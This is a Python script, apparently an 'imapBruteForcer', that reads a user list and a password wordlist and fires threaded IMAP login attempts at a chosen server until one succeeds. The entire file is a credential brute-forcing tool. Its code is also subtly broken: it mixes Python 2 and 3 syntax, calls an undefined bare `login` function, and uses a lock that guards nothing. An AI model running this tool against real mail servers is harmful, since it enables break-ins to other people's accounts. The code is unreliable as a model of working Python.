#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading, time, random, sys, imaplib, socket
from imaplib import IMAP4
from copy import copy
 
 
if len(sys.argv) !=4:
        print ("Usage: ./imapbrute.py <server> <userlist> <wordlist>")
        sys.exit(1)
 
 
try:
        users = open(sys.argv[2], "r").readlines()
except(IOError): 
        print ("Error: Check your userlist path\n")
        sys.exit(1)
  
try:
        words = open(sys.argv[3], "r").readlines()
except(IOError): 
        print ("Error: Check your wordlist path\n")
        sys.exit(1)
 
 
print ("\n\t  imapBruteForcer v1.0")
print ("\t--------------------------------------------------\n")
print ("[+] Server:"),sys.argv[1]
print ("[+] Users Loaded:"),len(users)
print ("[+] Words Loaded:"),len(words),"\n"
 
 
wordlist = copy(words)
 
 
def reloader():
        for word in wordlist:
                words.append(word)
 
 
def getword():
        lock = threading.Lock()
        lock.acquire()
        if len(words) != 0:
                value = random.sample(words,  1)
                words.remove(value[0])          
        else:
                print ("\nReloading Wordlist - Changing User\n")
                reloader()
                value = random.sample(words,  1)
                users.remove(users[0])
                
        lock.release()
        if len(users) ==1:
                return value[0][:-1], users[0]
        else:
                return value[0][:-1], users[0][:-1]
                
class Worker(threading.Thread):
        
        def run(self):
                value, user = getword()
                try:
                        print ("-")*12
                        print ("User:",user,"Password:"),value
                        M = imaplib.IMAP4(sys.argv[1])
                        M = login(user, value)
                        print ("\t\nLogin successful:"),user, value 
                        M.close()
                        M.logout()
                        work.join()
                        sys.exit(2)
                except(IMAP4.error, socket.gaierror, socket.error, socket.error), msg: 
                        print ("An error occurred:"), msg
                        pass
 
for i in range(len(words)*len(users)):
        work = Worker()
        work.start()
        time.sleep(1)
 